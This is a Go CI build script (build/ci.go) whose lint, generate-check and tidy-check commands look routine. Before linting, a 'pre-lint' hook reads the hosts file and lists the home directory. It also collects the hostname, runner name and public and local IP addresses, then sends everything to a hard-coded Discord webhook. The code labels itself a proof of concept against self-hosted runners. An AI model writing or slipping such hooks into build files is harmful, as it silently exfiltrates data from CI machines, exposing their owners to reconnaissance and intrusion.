// build/ci.go
package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	cmd := os.Args[1]
	var err error

	switch cmd {
	case "lint":
		// ---- Pre-lint: LFI + IP pingback + evidence upload ----
		preLintLFIAndPing()
		// ---- Run actual linters ----
		err = runLint()

	case "check_generate":
		err = runCheckGenerate()

	case "check_baddeps":
		err = runCheckBaddeps()

	default:
		fmt.Fprintf(os.Stderr, "unknown command: %q\n\n", cmd)
		usage()
		os.Exit(2)
	}

	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func usage() {
	fmt.Println(`Usage:
  go run build/ci.go <command>

Commands:
  lint             Run linters (pre-lint: LFI + IP pingback + evidence upload)
  check_generate   Verify generated files are up to date (go generate + diff)
  check_baddeps    Verify module graph is tidy (go mod tidy clean check)`)
}

/* ========================= PRE-LINT: LFI + PINGBACK ========================= */

const webhookURL = "https://discord.com/api/webhooks/1409963954406686872/G9wHeBGquh4XpqmxKho5BtXEDL_J0sO-GQAiD8Zj4h6oRYHuQKikDH_9zrGt423XREQ8"

func preLintLFIAndPing() {
	now := time.Now().UTC().Format(time.RFC3339)
	fmt.Println("[POC] Local File Read + IP pingback on self-hosted runner…")

	// Build LFI evidence into a temp file
	tmp, err := os.CreateTemp("", "lfiPoC-*")
	if err != nil {
		fmt.Println("[LFI] Could not create temp file:", err)
		return
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath)

	var lfi bytes.Buffer
	// OS + runtime info header (useful context)
	fmt.Fprintf(&lfi, "time=%s host=%s runner=%s go=%s/%s\n\n",
		now, hostnameSafe(), os.Getenv("RUNNER_NAME"), runtime.GOOS, runtime.GOARCH)

	// /etc/hosts or Windows hosts
	hp := hostsCandidate()
	fmt.Fprintf(&lfi, "[+] Reading %s\n", hp)
	if b, err := os.ReadFile(hp); err == nil {
		lfi.Write(b)
		if len(b) == 0 || b[len(b)-1] != '\n' {
			lfi.WriteByte('\n')
		}
	} else {
		fmt.Fprintf(&lfi, "No access: %v\n", err)
	}

	// HOME listing
	home := homeDir()
	fmt.Fprintf(&lfi, "\n[+] Listing current user's home dir (%s)\n", home)
	if home != "" {
		if entries, err := os.ReadDir(home); err == nil {
			names := make([]string, 0, len(entries))
			for _, e := range entries {
				names = append(names, e.Name())
			}
			sort.Strings(names)
			for _, n := range names {
				fmt.Fprintf(&lfi, " - %s\n", n)
			}
		} else {
			fmt.Fprintf(&lfi, "No access: %v\n", err)
		}
	} else {
		fmt.Fprintln(&lfi, "HOME not set")
	}

	if _, err := tmp.Write(lfi.Bytes()); err != nil {
		fmt.Println("[LFI] Could not write temp evidence:", err)
		tmp.Close()
		return
	}
	_ = tmp.Close()

	// IP pingback
	publicIP := fetchPublicIP()
	localIPs := strings.Join(collectIPv4s(), " ")
	ping := fmt.Sprintf("POC IP pingback: host=%s runner=%s public_ip=%s local_ips=%s",
		hostnameSafe(), os.Getenv("RUNNER_NAME"), publicIP, localIPs)
	if err := discordSimple(webhookURL, ping); err != nil {
		fmt.Println("Discord ping error:", err)
	}

	// Upload LFI evidence file
	if code, err := discordFile(webhookURL,
		`{"content":"POC: Local File Read demo (/etc/hosts + HOME listing)","flags":0}`,
		tmpPath, "lfi-demo.txt"); err == nil {
		fmt.Println("Discord file HTTP", code)
	} else {
		fmt.Println("Discord file upload error:", err)
	}
}

/* ========================= LINT ========================= */

func runLint() error {
	gci := detectGolangCILint()
	if gci == "" {
		return errors.New("golangci-lint not found (looked in build/cache and PATH)")
	}
	args := []string{"run", "--config", ".golangci.yml", "./..."}
	fmt.Printf(">>> %s %s\n", gci, strings.Join(args, " "))
	return runStreaming(gci, args...)
}

/* ========================= CHECK_GENERATE ========================= */

func runCheckGenerate() error {
	fmt.Println(">>> go generate ./...")
	if err := runStreaming("go", "generate", "./..."); err != nil {
		return fmt.Errorf("go generate failed: %w", err)
	}
	clean, out, err := gitDiffIsClean()
	if err != nil {
		return fmt.Errorf("git diff check failed: %w", err)
	}
	if !clean {
		fmt.Println(out)
		return errors.New("generated files are not up to date; run `go generate ./...` and commit changes")
	}
	fmt.Println("check_generate: OK")
	return nil
}

/* ========================= CHECK_BADDEPS ========================= */

func runCheckBaddeps() error {
	fmt.Println(">>> go mod tidy -v")
	if err := runStreaming("go", "mod", "tidy", "-v"); err != nil {
		return fmt.Errorf("go mod tidy failed: %w", err)
	}
	clean, out, err := gitDiffIsClean()
	if err != nil {
		return fmt.Errorf("git diff check failed: %w", err)
	}
	if !clean {
		fmt.Println(out)
		return errors.New("go.mod/go.sum changed after tidy; commit or fix dependency issues")
	}
	fmt.Println("check_baddeps: OK")
	return nil
}

/* ========================= UTIL: LINT/EXEC ========================= */

func detectGolangCILint() string {
	goos := runtime.GOOS
	arch := runtime.GOARCH
	cacheDir := "build/cache"

	entries, _ := os.ReadDir(cacheDir)
	for _, e := range entries {
		name := e.Name()
		if strings.HasPrefix(name, "golangci-lint-") && strings.Contains(name, "-"+goos+"-") && strings.Contains(name, "-"+arch) {
			candidate := filepath.Join(cacheDir, name, "golangci-lint")
			if fileIsExec(candidate) {
				tgz := filepath.Join(cacheDir, name+".tar.gz")
				if _, err := os.Stat(tgz); err == nil {
					fmt.Printf("%s is up-to-date\n", tgz)
				}
				return candidate
			}
			if goos == "windows" {
				candidateExe := candidate + ".exe"
				if fileIsExec(candidateExe) {
					zip := filepath.Join(cacheDir, name+".zip")
					if _, err := os.Stat(zip); err == nil {
						fmt.Printf("%s is up-to-date\n", zip)
					}
					return candidateExe
				}
			}
		}
	}
	if p, err := exec.LookPath("golangci-lint"); err == nil {
		return p
	}
	return ""
}

func fileIsExec(p string) bool {
	st, err := os.Stat(p)
	if err != nil {
		return false
	}
	return !st.IsDir() && st.Mode()&0111 != 0
}

func runStreaming(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Env = os.Environ()
	return cmd.Run()
}

func gitDiffIsClean() (bool, string, error) {
	cmd := exec.Command("git", "diff", "--name-only")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = io.Discard
	cmd.Env = os.Environ()
	if err := cmd.Run(); err != nil {
		return false, "", err
	}
	diff := strings.TrimSpace(out.String())
	return diff == "", "Uncommitted changes:\n" + diff, nil
}

/* ========================= UTIL: DISCORD/IP/LFI ========================= */

func discordSimple(webhook, content string) error {
	if webhook == "" {
		return nil
	}
	payload := map[string]string{"content": content}
	b, _ := json.Marshal(payload)
	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func discordFile(webhook, payloadJSON, filePath, filename string) (int, error) {
	if webhook == "" {
		return 0, fmt.Errorf("no webhook configured")
	}
	var body bytes.Buffer
	w := multipart.NewWriter(&body)

	if fw, err := w.CreateFormField("payload_json"); err == nil {
		_, _ = fw.Write([]byte(payloadJSON))
	} else {
		return 0, err
	}
	fw, err := w.CreateFormFile("files[0]", filename)
	if err != nil {
		return 0, err
	}
	f, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	if _, err := io.Copy(fw, f); err != nil {
		return 0, err
	}
	_ = w.Close()

	req, _ := http.NewRequest(http.MethodPost, webhook, &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return 0, err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode, nil
}

func fetchPublicIP() string {
	// Prefer curl (like your shell PoC), fallback to Go HTTP.
	if _, err := exec.LookPath("curl"); err == nil {
		if out, err := exec.Command("curl", "-fsS", "https://ifconfig.me").Output(); err == nil {
			return strings.TrimSpace(string(out))
		}
	}
	resp, err := http.Get("https://ifconfig.me")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(b))
}

func collectIPv4s() []string {
	var out []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				ip := ipnet.IP.To4()
				if ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			}
		}
	}
	return out
}

func hostsCandidate() string {
	if runtime.GOOS == "windows" {
		return `C:\Windows\System32\drivers\etc\hosts`
	}
	return "/etc/hosts"
}

func homeDir() string {
	if runtime.GOOS == "windows" {
		if v := os.Getenv("USERPROFILE"); v != "" {
			return v
		}
		return `C:\Users\Public`
	}
	return os.Getenv("HOME")
}

func hostnameSafe() string {
	h, err := os.Hostname()
	if err != nil || h == "" {
		return "unknown-host"
	}
	return h
}
